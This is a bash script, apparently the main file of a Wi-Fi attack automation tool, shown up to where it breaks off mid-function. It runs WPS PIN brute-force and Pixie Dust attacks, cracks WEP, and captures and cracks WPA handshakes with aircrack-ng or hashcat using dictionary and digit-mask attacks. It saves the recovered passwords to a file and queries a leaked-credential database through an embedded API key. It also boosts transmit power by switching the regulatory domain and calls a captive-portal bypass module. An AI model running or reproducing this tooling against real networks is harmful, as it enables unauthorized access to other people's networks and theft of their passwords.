#!/bin/bash

# Mi-Al/WiFi-autopwner 2
VERS="20190113" # hate-tourists-release

IFACE=""
REPLY=""

source $(dirname $0)/settings.sh

if [ -e "cracked.txt" ]; then
	echo ""
else
	echo "" > cracked.txt
fi

if [ -e "blacklist.txt" ]; then
	echo ""
else
	echo "" > blacklist.txt
fi

if [ -d "handshakes" ]; then
	echo ""
else
	mkdir handshakes
fi

if [ -d "hccapx" ]; then
	echo ""
else
	mkdir hccapx
fi


if [[ "$(locale | grep LANG | grep -o ru)" == "ru" ]]; then
	LANGUAGE="Russian"
else
	LANGUAGE="English"
fi

source $(dirname $0)/lang/main.sh

function selectInterface {
	clear
	COUNTER=0

	while read -r line ; do
		DEVS[$COUNTER]=$line
		COUNTER=$((COUNTER+1))
	done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")


	if [[ ${#DEVS[@]} == 0 ]]; then
		echo -e ${Lang[Strings1]}
		exit		
	fi

	if [[ ${#DEVS[@]} == 1 ]]; then
		echo -e ${Lang[Strings2]}
		IFACE=${DEVS[0]}
	fi

	if [[ ${#DEVS[@]} -gt 1 ]]; then
		COUNTER=0
		echo ${Lang[Strings3]}
		for i in "${DEVS[@]}";
		do
			echo "$((COUNTER+1)). ${DEVS[COUNTER]}  `sudo airmon-ng | grep ${DEVS[COUNTER]} | awk '{$1=$2=$3=""; print " // " $0}'`"
			COUNTER=$((COUNTER+1))
		done
		read -p "${Lang[Strings4]} " INTNUM	
		IFACE=${DEVS[$((INTNUM-1))]}		
	fi

	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function putInMonitorMode {
	if [[ "$IFACE" ]]; then
		clear
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}


function putInManagedMode {
	if [[ "$IFACE" ]]; then
		clear
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
		sudo systemctl start NetworkManager
		REPLY=""
		showMainMenu	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function putInMonitorModePlus {
	if [[ "$IFACE" ]]; then
		clear
		sudo systemctl stop NetworkManager
		sudo airmon-ng check kill
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

#Perform a test to determine if fcs parameter is needed on wash scanning #from airgeddon
function set_wash_parametrization {

	fcs=""
	readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "$IFACE" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs="-C"
			break
		fi
	done
}

function showWPSNetworks {
	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings7]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
#		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
		echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
		read -p "${Lang[Strings9]}" AIM
		echo ${Lang[Strings10]}
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM"
		echo ${Lang[Strings11]}
		sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
		sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"

	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi

	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function PixieDustAattack {

	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings8]}
	if [[ "$IFACE" ]]; then
		sudo timeout 120 xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
		if [[ "$FOUNDWPS" ]]; then
			echo ${Lang[Strings14]}
			echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
			echo '---------------------------------------------------------------------------------------------------------------'
			cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

			COUNTER=0

			while read -r line ; do
				WPSS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $1}' | sed 's/,//')

			for i in "${WPSS[@]}"; 
			do
				echo ""
				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')

				if [[ "$ESSID" ]]; then
					echo ${Lang[Strings12]}" $i ($ESSID)";
					echo ${Lang[Strings11]}
					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
					if [[ "$isBlocked" == "Yes" || "`grep "$ESSID" cracked.txt`" || "`grep "$ESSID" blacklist.txt`" ]]; then
						echo -e ${Lang[Strings37]}
					else
						sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
		
						sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
						sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E $i | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"

						PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')

						if [[ "$PIN" ]]; then
							echo -e ${Lang[Strings13]}"$PIN"
							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
							echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
							sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
							sleep 3
							echo "wps_reg $i $PIN" | sudo wpa_cli

							echo -e ${Lang[Strings34]}
							sleep 60		
							if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
								echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
								echo "$ESSID" >> cracked.txt
								echo "$ESSID:"`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'` >> all_wifi_passwords.txt
							else 
								echo -e ${Lang[Strings36]}
							fi

							sudo airmon-ng check kill

							rm /tmp/suppl.conf
							sudo rm /var/run/wpa_supplicant/$IFACE
	
							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
						else
							echo ${Lang[Strings15]}
						fi					
					fi
				else
					ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
					echo $ESSID
					echo ''
				fi
			done
		else
			echo -e ${Lang[Strings16]}
		fi

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function showOpen {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings17]}
		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
		if [[ "$NOPASS" ]]; then
			echo -e ${Lang[Strings18]}
			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk -F"," '{print "MAC: " $1 ", Power:" $9 ", Data: " $11 ",   Name:" $14}'
		else
			echo -e ${Lang[Strings19]}	
		fi

		sudo rm /tmp/openwifinetworks*

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function attackWEP {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings20]}
		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -t WEP -w /tmp/wepwifinetworks --output-forma csv"
		WEP=$(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,')
		if [[ "$WEP" ]]; then
			echo ${Lang[Strings21]}
			cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $19}' | sed 's/,//' | cat -b

			COUNTER=0

			while read -r line ; do
				WEPS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $1}' | sed 's/,//')

			for i in "${WEPS[@]}"; 
			do 
				echo ${Lang[Strings12]}" $i";
				#sudo iw dev "$IFACE" set channel `cat /tmp/wepwifinetworks-01.csv | grep -E "$i" | awk '{print $6}' | sed 's/,//'`
				cd /tmp
				sudo timeout 600 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -b $i -c $(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $6}' | sed 's/,//')"
				WEPCracked=$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}')
				if [[ "$WEPCracked" ]]; then
					echo -e ${Lang[Strings22]}$(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $1}' | sed 's/,//')"\e[0m"
					echo -e ${Lang[Strings23]}$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $3}' | sed 's/,//')
					rm /tmp/besside.log
					rm /tmp/wpa.cap
					rm /tmp/wep.cap
				else
					echo ${Lang[Strings15]}
				fi
				cd
			done
		else
			echo -e ${Lang[Strings24]}
		fi

		sudo rm /tmp/wepwifinetworks*

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

# not used anymore, but reserved as extra option
function getAllHandshakes-old {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings25]}

		sudo timeout 1200 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $IFACE -f 30000 -w autopwner --berlin 1200" &
		sudo timeout 1200 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo zizzania -i $IFACE"
		
		echo ${Lang[Strings26]}
		sleep 1
		sudo pyrit -r "$(ls | grep -E autopwn | grep -E cap | tail -n 1)" analyze


		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
			REPLY=""
			showMainMenu
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}


function getAllHandshakes {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings25]}

		sudo timeout 1200 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -W"		
		
		bash ./modules/handshakes_extractor.sh wpa.cap

		rm wep.cap
		rm wpa.cap
		rm besside.log

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
			REPLY=""
			showMainMenu
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function getAllHandshakesLight {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings25]}

		sudo timeout 1200 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -W"		
		
		bash ./modules/handshakes_extractor.sh wpa.cap

		rm wep.cap
		rm wpa.cap
		rm besside.log

	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function justCrackTheLastHandshakes {
		theLastDir="$(ls handshakes/ | tail -n 1)"
		while read -r "AP" ; do
			ESSID="$(echo "$AP" | cut -d "." -f 1)"
			if [[ "`grep \"$ESSID\" cracked.txt`" || "`grep \"$ESSID\" blacklist.txt`" ]]; then
				echo -e "${Lang[Strings50]} $ESSID"
			else
				if [ "$CRACKER" == "aircrack-ng" ]; then
					isJustCracked=0
					if [ $RunDictAttack -eq 1 ]; then
						echo -e "${Lang[Strings48]} \e[5m$ESSID\033[0m"
						sleep 3
						sudo xterm -geometry "150x50+400+0" -e "aircrack-ng -w dict/rockyou_cleaned.txt -e \"$ESSID\" -l \"temp_cracked.txt\" \"handshakes/$theLastDir/$AP\""
						if [[ -f "temp_cracked.txt" ]]; then
							echo -e "${Lang[Strings35]}"
							cat temp_cracked.txt
							echo ''
							echo "$ESSID" >> cracked.txt
							echo "$ESSID:`cat temp_cracked.txt`" >> all_wifi_passwords.txt
							sudo rm temp_cracked.txt
							isJustCracked=1
						fi
						sleep 3
					fi
					if [[ $RunMaskDigitAttack -eq 1 && isJustCracked -eq 0 ]]; then
						echo -e "${Lang[Strings49]} \e[5m$ESSID\033[0m"
						sleep 3
						sudo xterm -geometry "150x50+400+0" -e "crunch 8 10 012345678 | aircrack-ng -w - -e \"$ESSID\" \"handshakes/$theLastDir/$AP\""
						if [[ -f "temp_cracked.txt" ]]; then
							echo -e "${Lang[Strings35]}"
							cat temp_cracked.txt
							echo ''
							echo "$ESSID" >> cracked.txt
							echo "$ESSID:`cat temp_cracked.txt`" >> all_wifi_passwords.txt
							sudo rm temp_cracked.txt
						fi
						sleep 3
					fi
	
				elif [ "$CRACKER" == "hashcat" ]; then
					isJustCracked=0
					sudo aircrack-ng -j "hccapx/$ESSID" "handshakes/$theLastDir/$AP"
					if [ $RunDictAttack -eq 1 ]; then
						echo -e "${Lang[Strings48]} \e[5m$ESSID\033[0m"
						sleep 3
						sudo xterm -geometry "150x50+400+0" -e "sudo hashcat -m 2500 -a 0 -D 1,2 -o \"temp_cracked.txt\" \"hccapx/$ESSID\".hccapx dict/rockyou_cleaned.txt"
						if [[ -f "temp_cracked.txt" ]]; then
							echo -e "${Lang[Strings35]}"
							cat temp_cracked.txt
							echo ''
							echo "$ESSID" >> cracked.txt
							echo "$ESSID:`cat temp_cracked.txt`" >> all_wifi_passwords.txt
							sudo rm temp_cracked.txt
							isJustCracked=1
						fi
						echo ''
						sleep 3
					fi
					if [[ $RunMaskDigitAttack -eq 1 && isJustCracked -eq 0 ]]; then
						echo -e "${Lang[Strings49]} \e[5m$ESSID\033[0m"
						sleep 3
						sudo xterm -geometry "150x50+400+0" -e "sudo hashcat -m 2500 -a 3 -D 1,2 -i --increment-min=8 --increment-max=10 \"hccapx/$ESSID.hccapx\" ?d?d?d?d?d?d?d?d?d?d"
						if [[ -f "temp_cracked.txt" ]]; then
							echo -e "${Lang[Strings35]}"
							cat temp_cracked.txt
							echo ''
							echo "$ESSID" >> cracked.txt
							echo "$ESSID:`cat temp_cracked.txt`" >> all_wifi_passwords.txt
							sudo rm temp_cracked.txt
						fi
						echo ''
						sleep 3
					fi
				else
					echo ${Lang[Strings47]}
				fi
			fi
		done < <(ls handshakes/$theLastDir)


		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
}

function getAllHandshakesAndCrackThem {
	getAllHandshakesLight
	justCrackTheLastHandshakes
}


function getCertainHandshake {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings51]}

		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -w /tmp/allwifinetworks --output-format csv"
		ALL=$(cat /tmp/allwifinetworks-01.csv)
		if [[ "$ALL" ]]; then
			echo -e ${Lang[Strings53]}
			cat /tmp/allwifinetworks-01.csv | cut -d "," -f 14 | sed 's/ESSID//' | grep -E -v '^[[:space:]]*$' | cat -b
		else
			echo -e ${Lang[Strings52]}	
		fi


		read -p "${Lang[Strings9]}" AIM
		echo ${Lang[Strings10]}
		ESSID=`cat /tmp/allwifinetworks-01.csv | cut -d "," -f 14 | sed 's/ESSID//' | grep -E -v '^[[:space:]]*$' | awk 'NR=='"$AIM" | sed 's/ //'`
		BSSID=`cat /tmp/allwifinetworks-01.csv | grep "$ESSID" | grep -o -E '[A-Fa-f0-9:]{17}'`
		echo ${Lang[Strings11]}

		sudo rm /tmp/allwifinetworks*

		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo timeout 1200 besside-ng $IFACE -W -b $BSSID"		
		
		bash ./modules/handshakes_extractor.sh wpa.cap

		rm wep.cap
		rm wpa.cap
		rm besside.log

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function getCertainHandshakeAndCrackIt {

	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings51]}

		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -w /tmp/allwifinetworks --output-format csv"
		ALL=$(cat /tmp/allwifinetworks-01.csv)
		if [[ "$ALL" ]]; then
			echo -e ${Lang[Strings53]}
			cat /tmp/allwifinetworks-01.csv | cut -d "," -f 14 | sed 's/ESSID//' | grep -E -v '^[[:space:]]*$' | cat -b
		else
			echo -e ${Lang[Strings52]}	
		fi


		read -p "${Lang[Strings9]}" AIM
		echo ${Lang[Strings10]}
		ESSID=`cat /tmp/allwifinetworks-01.csv | cut -d "," -f 14 | sed 's/ESSID//' | grep -E -v '^[[:space:]]*$' | awk 'NR=='"$AIM" | sed 's/ //'`
		BSSID=`cat /tmp/allwifinetworks-01.csv | grep "$ESSID" | grep -o -E '[A-Fa-f0-9:]{17}'`
		echo ${Lang[Strings11]}

		sudo rm /tmp/allwifinetworks*

		sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -W -b $BSSID"		
		
		bash ./modules/handshakes_extractor.sh wpa.cap

		gotHandshake=`cat besside.log | grep 'Got WPA handshake'`

		rm wep.cap
		rm wpa.cap
		rm besside.log

	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi


	if [[ -n "$gotHandshake" ]]; then
		justCrackTheLastHandshakes
		REPLY=""
	else
		echo "${Lang[Strings74]}"
		REPLY=""
	fi	
}


function showWPAPassFromPin {

	echo ${Lang[Strings32]}

	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings7]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up

		read -p "${Lang[Strings9]}" AIM
		read -p "${Lang[Strings33]}" PIN
		echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
		sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
		sleep 3
		echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli
		echo -e ${Lang[Strings38]}
		echo -e ${Lang[Strings34]}
		sleep 60		
		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
			echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
			ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $7}')
			echo "$ESSID" >> cracked.txt
			echo "$ESSID:"`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'` >> all_wifi_passwords.txt
		else
			sudo airmon-ng check kill
			sudo rm /var/run/wpa_supplicant/$IFACE
			echo -e ${Lang[Strings36]}
			sudo timeout 180 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
			sleep 3
			echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli	
			echo -e ${Lang[Strings39]}		
			echo -e ${Lang[Strings40]}
			sleep 180

			if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
				echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $7}')
				echo "$ESSID" >> cracked.txt
				echo "$ESSID:"`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'` >> all_wifi_passwords.txt
			else
				echo -e ${Lang[Strings36]}
			fi
		fi

		rm /tmp/suppl.conf
		sudo airmon-ng check kill
		sudo rm /var/run/wpa_supplicant/$IFACE
		exit
		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function 3WIFI {
	if [[ "$IFACE" ]]; then

		echo ''
		echo ${Lang[Strings42]}

		echo ''
		read  -p "${Lang[Strings41]}" -i "n" isFiveEnable 

		if [[ "$isFiveEnable" == "y" ]]; then
			CH='--channel 1-13,36-165'
		else
			CH=''
		fi

		sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $CH --berlin 60000 -w /tmp/3wifi $IFACE"

		FILE='/tmp/3wifi-01.csv'

		echo ${Lang[Strings43]}
		while read -r line ; do

			BSSID=`echo $line | awk '{print $1}' | sed 's/,//'`

			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`

			echo "${Lang[Strings44]} $BSSID ${Lang[Strings45]} $ESSID)"
			echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&bssid='$BSSID`\e[0m" | grep -E -v ':\[\]'
			sleep 10
		
		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)

		echo ''
		echo "${Lang[Strings46]}"
		while read -r line ; do

			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`

			if [[ "$ESSID" ]]; then
				echo "${Lang[Strings44]} $ESSID"
				ESSID=`echo $ESSID | sed 's/ /+/g'`
				echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&sens=1&bssid=*&essid='$ESSID`\e[0m" | grep -E -v ':\[\]'
				sleep 10
			fi
		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)

		echo ''

		sudo rm /tmp/3wifi*

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function lanInspector {
	if [[ "$LANGUAGE" == "Russian" ]]; then
		sudo bash modules/lan_inspector.sh
	else
		sudo bash modules/lan_inspector_en.sh
	fi

	REPLY=""
	showMainMenu
}

function txPowerUp {
	if [[ "$IFACE" ]]; then
		echo -e "${Lang[Strings54]} \e[5m`sudo iw dev $IFACE info | grep 'txpower' | sed 's/txpower //'`\033[0m"
		echo ${Lang[Strings56]}
		sudo iw reg set BZ
		sudo ip link set $IFACE down
		sudo iw dev $IFACE set txpower fixed 30mBm
		sudo ip link set $IFACE up

		echo -e "${Lang[Strings55]} \e[5m`sudo iw dev $IFACE info | grep 'txpower' | sed 's/txpower //'`\033[0m"

		read -n 1 -s -r -p "${Lang[Strings69]}"

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi

	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi	
}

function txPowerUpPermanentKali {
	sudo bash modules/txpower_up_kali.sh
	REPLY=""
	showMainMenu
}

function txPowerUpPermanentArch {
	echo "${Lang[Strings57]}"
	echo "bash modules/txpower_up_arch.sh"
	#bash modules/txpower_up_arch.sh
}

function connectWifiWithPassword {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings58]}
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
		sudo iw dev "$IFACE" scan | grep "SSID: " | sed 's/SSID: //' | sed -e 's/^[ \t]*//' | grep -E -v "^$" > /tmp/allwifinetworks
		cat /tmp/allwifinetworks | cat -b
		read -p "${Lang[Strings59]} " AIM
		ESSID=`cat /tmp/allwifinetworks | awk 'NR=='"$AIM" | sed 's/ //'`
		echo "${Lang[Strings60]} $ESSID"
		sudo rm /tmp/allwifinetworks*
		read -p "${Lang[Strings61]} " PASSWORD
		wpa_passphrase "$ESSID" "$PASSWORD" > /tmp/wpa_"$ESSID".conf
		wpa_supplicant -B -i "$IFACE" -c /tmp/wpa_"$ESSID".conf -d
		echo "${Lang[Strings62]}"
		sleep 5
		dhclient "$IFACE"
		echo "${Lang[Strings63]}"
		ping -c 4 google.com

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function connectOpenWifi {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings58]}

		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
		if [[ "$NOPASS" ]]; then
			echo -e ${Lang[Strings18]}
			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk -F"," '{print "MAC: " $1 ", Power:" $9 ", Data: " $11 ",   Name:" $14}' | cat -b
		else
			echo -e ${Lang[Strings19]}	
		fi
		read -p "${Lang[Strings59]} " AIM
		ESSID=`cat /tmp/openwifinetworks-01.csv | grep 'OPN' | awk 'NR=='"1"  | awk -F", " '{print $14}'`
		sudo rm /tmp/openwifinetworks*

		echo "${Lang[Strings60]} $ESSID"
		echo -e "network={\n        ssid=\"$ESSID\"\n        key_mgmt=NONE\n        priority=100\n}" > /tmp/wpa_"$ESSID".conf
		wpa_supplicant -B -i "$IFACE" -c /tmp/wpa_"$ESSID".conf
		echo "${Lang[Strings62]}"
		sleep 5
		dhclient "$IFACE"
		echo "${Lang[Strings63]}"
		ping -c 4 google.com



		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function hackCaptive {
	sudo bash modules/hack-captive-mial.sh
	REPLY=""
	showMainMenu
	echo ''

	read -n 1 -s -r -p "${Lang[Strings69]}"

	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function showEveryone {
	if [[ "$IFACE" ]]; then

		echo ''
		echo ${Lang[Strings64]}

		echo ''
		read  -p "${Lang[Strings41]}" -i "n" isFiveEnable 

		if [[ "$isFiveEnable" == "y" ]]; then
			CH='--channel 1-13,36-165'
		else
			CH=''
		fi

		sudo timeout 300 xterm -geometry "150x50+400+0" -e "sudo airodump-ng $CH --berlin 60000 -w /tmp/everyone $IFACE"

		if [[ "$LANGUAGE" == "Russian" ]]; then
